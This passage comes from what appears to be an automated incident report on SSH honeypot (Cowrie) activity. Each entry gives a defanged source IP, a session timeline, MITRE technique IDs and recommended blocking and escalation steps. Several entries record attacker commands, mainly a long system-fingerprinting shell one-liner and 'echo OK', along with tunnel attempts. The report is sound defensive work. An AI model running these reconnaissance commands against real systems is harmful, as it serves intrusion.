| `2026-07-08 21:04:25` | `cowrie.client.version` |
| `2026-07-08 21:04:25` | `cowrie.client.kex` |
| `2026-07-08 21:04:29` | `cowrie.login.success` |
| `2026-07-08 21:04:30` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0763aa5c059

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:05 |
| **Last Seen** | 2026-07-08 21:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:05:25` | `cowrie.session.connect` |
| `2026-07-08 21:05:25` | `cowrie.client.version` |
| `2026-07-08 21:05:25` | `cowrie.client.kex` |
| `2026-07-08 21:05:27` | `cowrie.login.success` |
| `2026-07-08 21:05:28` | `cowrie.session.params` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.success` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.command.input` |
| `2026-07-08 21:05:28` | `cowrie.log.closed` |
| `2026-07-08 21:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2c2c7b777e

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-08 21:05 |
| **Last Seen** | 2026-07-08 21:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:05:28` | `cowrie.session.connect` |
| `2026-07-08 21:05:29` | `cowrie.client.version` |
| `2026-07-08 21:05:29` | `cowrie.client.kex` |
| `2026-07-08 21:05:30` | `cowrie.login.success` |
| `2026-07-08 21:05:31` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c29ace36be4

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-07-08 21:06 |
| **Last Seen** | 2026-07-08 21:06 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:06:31` | `cowrie.session.connect` |
| `2026-07-08 21:06:33` | `cowrie.client.version` |
| `2026-07-08 21:06:35` | `cowrie.client.kex` |
| `2026-07-08 21:06:40` | `cowrie.login.success` |
| `2026-07-08 21:06:40` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea6c8da96e4

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-08 21:06 |
| **Last Seen** | 2026-07-08 21:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:06:46` | `cowrie.session.connect` |
| `2026-07-08 21:06:46` | `cowrie.client.version` |
| `2026-07-08 21:06:46` | `cowrie.client.kex` |
| `2026-07-08 21:06:47` | `cowrie.login.success` |
| `2026-07-08 21:06:47` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5829f00b8f04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:07 |
| **Last Seen** | 2026-07-08 21:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:07:40` | `cowrie.session.connect` |
| `2026-07-08 21:07:40` | `cowrie.client.version` |
| `2026-07-08 21:07:40` | `cowrie.client.kex` |
| `2026-07-08 21:07:41` | `cowrie.login.success` |
| `2026-07-08 21:07:42` | `cowrie.session.params` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.success` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.command.input` |
| `2026-07-08 21:07:42` | `cowrie.log.closed` |
| `2026-07-08 21:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31234539866f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:10 |
| **Last Seen** | 2026-07-08 21:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:10:02` | `cowrie.session.connect` |
| `2026-07-08 21:10:03` | `cowrie.client.version` |
| `2026-07-08 21:10:03` | `cowrie.client.kex` |
| `2026-07-08 21:10:03` | `cowrie.login.success` |
| `2026-07-08 21:10:05` | `cowrie.session.params` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.success` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.command.input` |
| `2026-07-08 21:10:05` | `cowrie.log.closed` |
| `2026-07-08 21:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724ba2e2d213

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 21:10 |
| **Last Seen** | 2026-07-08 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:10:35` | `cowrie.session.connect` |
| `2026-07-08 21:10:35` | `cowrie.client.version` |
| `2026-07-08 21:10:35` | `cowrie.client.kex` |
| `2026-07-08 21:10:36` | `cowrie.login.success` |
| `2026-07-08 21:10:36` | `cowrie.session.params` |
| `2026-07-08 21:10:36` | `cowrie.command.input` |
| `2026-07-08 21:10:37` | `cowrie.log.closed` |
| `2026-07-08 21:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f7f670b958

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:11 |
| **Last Seen** | 2026-07-08 21:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:11:27` | `cowrie.session.connect` |
| `2026-07-08 21:11:28` | `cowrie.client.version` |
| `2026-07-08 21:11:28` | `cowrie.client.kex` |
| `2026-07-08 21:11:34` | `cowrie.login.success` |
| `2026-07-08 21:11:37` | `cowrie.session.params` |
| `2026-07-08 21:11:37` | `cowrie.command.input` |
| `2026-07-08 21:11:38` | `cowrie.log.closed` |
| `2026-07-08 21:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6fbaca1826

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:12 |
| **Last Seen** | 2026-07-08 21:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:12:22` | `cowrie.session.connect` |
| `2026-07-08 21:12:22` | `cowrie.client.version` |
| `2026-07-08 21:12:22` | `cowrie.client.kex` |
| `2026-07-08 21:12:23` | `cowrie.login.success` |
| `2026-07-08 21:12:24` | `cowrie.session.params` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.success` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:24` | `cowrie.command.input` |
| `2026-07-08 21:12:25` | `cowrie.log.closed` |
| `2026-07-08 21:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9557dc9ffe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:14 |
| **Last Seen** | 2026-07-08 21:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:14:46` | `cowrie.session.connect` |
| `2026-07-08 21:14:46` | `cowrie.client.version` |
| `2026-07-08 21:14:46` | `cowrie.client.kex` |
| `2026-07-08 21:14:47` | `cowrie.login.success` |
| `2026-07-08 21:14:48` | `cowrie.session.params` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.success` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.command.input` |
| `2026-07-08 21:14:48` | `cowrie.log.closed` |
| `2026-07-08 21:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461a5f3cced4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:17 |
| **Last Seen** | 2026-07-08 21:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:17:10` | `cowrie.session.connect` |
| `2026-07-08 21:17:10` | `cowrie.client.version` |
| `2026-07-08 21:17:10` | `cowrie.client.kex` |
| `2026-07-08 21:17:11` | `cowrie.login.success` |
| `2026-07-08 21:17:12` | `cowrie.session.params` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.success` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.command.input` |
| `2026-07-08 21:17:12` | `cowrie.log.closed` |
| `2026-07-08 21:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c963cb6ee5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:19 |
| **Last Seen** | 2026-07-08 21:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:19:33` | `cowrie.session.connect` |
| `2026-07-08 21:19:33` | `cowrie.client.version` |
| `2026-07-08 21:19:33` | `cowrie.client.kex` |
| `2026-07-08 21:19:34` | `cowrie.login.success` |
| `2026-07-08 21:19:35` | `cowrie.session.params` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.success` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:35` | `cowrie.command.input` |
| `2026-07-08 21:19:36` | `cowrie.log.closed` |
| `2026-07-08 21:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f71b2fffb27f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:20 |
| **Last Seen** | 2026-07-08 21:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:20:37` | `cowrie.session.connect` |
| `2026-07-08 21:20:38` | `cowrie.client.version` |
| `2026-07-08 21:20:38` | `cowrie.client.kex` |
| `2026-07-08 21:20:43` | `cowrie.login.success` |
| `2026-07-08 21:20:46` | `cowrie.session.params` |
| `2026-07-08 21:20:46` | `cowrie.command.input` |
| `2026-07-08 21:20:47` | `cowrie.log.closed` |
| `2026-07-08 21:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a050daad5749

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 21:21 |
| **Last Seen** | 2026-07-08 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:21:14` | `cowrie.session.connect` |
| `2026-07-08 21:21:14` | `cowrie.client.version` |
| `2026-07-08 21:21:14` | `cowrie.client.kex` |
| `2026-07-08 21:21:14` | `cowrie.login.success` |
| `2026-07-08 21:21:16` | `cowrie.session.params` |
| `2026-07-08 21:21:16` | `cowrie.command.input` |
| `2026-07-08 21:21:16` | `cowrie.log.closed` |
| `2026-07-08 21:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a75e5daa3ea4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:21 |
| **Last Seen** | 2026-07-08 21:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:21:53` | `cowrie.session.connect` |
| `2026-07-08 21:21:53` | `cowrie.client.version` |
| `2026-07-08 21:21:53` | `cowrie.client.kex` |
| `2026-07-08 21:21:54` | `cowrie.login.success` |
| `2026-07-08 21:21:55` | `cowrie.session.params` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.success` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.command.input` |
| `2026-07-08 21:21:55` | `cowrie.log.closed` |
| `2026-07-08 21:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b25e584ef6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 21:23 |
| **Last Seen** | 2026-07-08 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:23:14` | `cowrie.session.connect` |
| `2026-07-08 21:23:14` | `cowrie.client.version` |
| `2026-07-08 21:23:14` | `cowrie.client.kex` |
| `2026-07-08 21:23:14` | `cowrie.login.success` |
| `2026-07-08 21:23:15` | `cowrie.session.params` |
| `2026-07-08 21:23:15` | `cowrie.command.input` |
| `2026-07-08 21:23:15` | `cowrie.log.closed` |
| `2026-07-08 21:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7521f560962

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:24 |
| **Last Seen** | 2026-07-08 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
